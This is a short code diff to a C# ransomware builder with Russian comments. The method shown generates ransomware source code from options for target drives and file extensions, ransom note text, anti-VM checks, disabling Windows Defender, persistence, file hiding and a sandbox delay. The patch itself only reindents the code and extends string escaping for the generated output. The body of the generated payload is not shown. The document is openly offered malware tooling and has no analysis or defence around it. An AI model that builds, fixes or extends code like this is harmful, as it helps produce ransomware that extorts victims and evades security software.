@@ -768,16 +768,24 @@ namespace RansomwareBuilder
         // ГЕНЕРАЦИЯ C# КОДА
         // ============================================================
         private string GenerateCSharpCode(
-            string drives, string exts, string exclude, string include,
-            string encExt, string noteName, string noteContent,
-            string fakeName, int algo, int fakeEnabled, int hideEnabled,
-            int antiVM, int disableDefender, int persistence,
-            int hideFiles, int sandboxDelay,
-            string wallpaperBase64, string wallpaperExt)
-        {
-            string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
-            
-            return $@"
+    string drives, string exts, string exclude, string include,
+    string encExt, string noteName, string noteContent,
+    string fakeName, int algo, int fakeEnabled, int hideEnabled,
+    int antiVM, int disableDefender, int persistence,
+    int hideFiles, int sandboxDelay,
+    string wallpaperBase64, string wallpaperExt)
+{
+    // ============================================================
+    // ЭКРАНИРУЕМ ВСЕ СПЕЦСИМВОЛЫ ДЛЯ C#
+    // ============================================================
+    string Escape(string s) => s
+        .Replace("\\", "\\\\")
+        .Replace("\"", "\\\"")
+        .Replace("\n", "\\n")
+        .Replace("\r", "\\r")
+        .Replace("\t", "\\t");
+    
+    return $@"
 using System;
 using System.IO;
 using System.Linq;
@@ -1063,7 +1071,7 @@ namespace Ransomware
     }}
 }}
 ";
-        }
+}
         
         // ============================================================
         // ОСНОВНАЯ ЛОГИКА СБОРКИ
